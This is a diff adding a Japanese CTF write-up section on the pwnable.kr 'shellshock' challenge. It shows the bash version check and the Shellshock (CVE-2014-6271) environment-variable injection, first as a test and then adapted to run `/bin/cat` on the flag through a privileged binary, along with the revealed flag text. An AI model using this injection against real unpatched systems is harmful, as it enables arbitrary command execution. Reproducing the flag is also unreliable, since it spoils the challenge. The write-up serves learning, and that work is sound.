@@ -120,3 +120,34 @@ Good!
 Mommy, I thought libc random is unpredictable...
 ```
 
+## shellshock (1pt)
+
+shellshockという脆弱性を用いる問題。念の為bashのバージョンを確認してみると、脆弱性の影響を受けるバージョンであった。
+
+```terminal
+shellshock@pwnable:~$ ./bash --version
+./bash --version
+GNU bash, version 4.2.25(1)-release (x86_64-pc-linux-gnu)
+Copyright (C) 2011 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+
+This is free software; you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+```
+
+エクスプロイトの例が書かれていたため使ってみる。参考：<https://nikhilh20.medium.com/exploit-bash-shellshock-part-1-ad1636acaf9e>  
+`env x='() { :;}; echo Oh No!' ./bash -c "echo Testing!"`というコマンドを実行すると、脆弱性のあるバージョンのみ`echo Oh No!`も実行されてしまう。
+
+```terminal
+shellshock@pwnable:~$ env x='() { :;}; echo Oh No!' ./bash -c "echo Testing!"
+Oh No!
+Testing!
+```
+
+このエクスプロイトコードを書き換え、実行可能ファイル`shellshock`に適用してやれば、root権限で任意のコマンドが実行可能となる。これを利用してflagが手に入る。
+
+```terminal
+shellshock@pwnable:~$ env x='() { :;}; /bin/cat /home/shellshock/flag' ./shellshock
+only if I knew CVE-2014-6271 ten years ago..!!
+Segmentation fault (core dumped)
+```
